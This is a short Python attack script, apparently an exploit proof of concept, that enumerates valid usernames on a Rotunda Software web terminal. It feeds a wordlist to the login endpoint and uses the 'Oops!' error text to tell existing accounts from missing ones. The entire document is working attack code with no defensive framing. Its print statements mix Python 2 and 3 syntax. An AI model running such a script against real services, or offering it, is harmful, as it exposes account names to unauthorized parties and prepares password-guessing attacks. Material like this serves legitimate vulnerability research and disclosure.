import sys
import os.path
import requests

print("[+] Rotunda Software Username Enumeration")
 
if len(sys.argv) != 3:
    print 'Usage:', sys.argv[0], 'web url', 'usernames.txt'
    sys.exit(1)
 
if not os.path.exists(sys.argv[2]):
    print('usernames.txt does not exist')
    sys.exit(1)
 
headers = {
    'Origin':'https://' + sys.argv[1],
    'X-Requested-With':'XMLHttpRequest'
}
 
print('Checking usernames...')
 
f = open(sys.argv[2], 'r')
 
for user in f:
    user = user.strip()
    req = requests.get('https://'+sys.argv[1]+'/l/web-terminal/login/'+user,headers=headers)
    if 'Oops!' in req.text:
        print('[NOT FOUND] ' + user)
    else:
        print('[FOUND] ' + user)
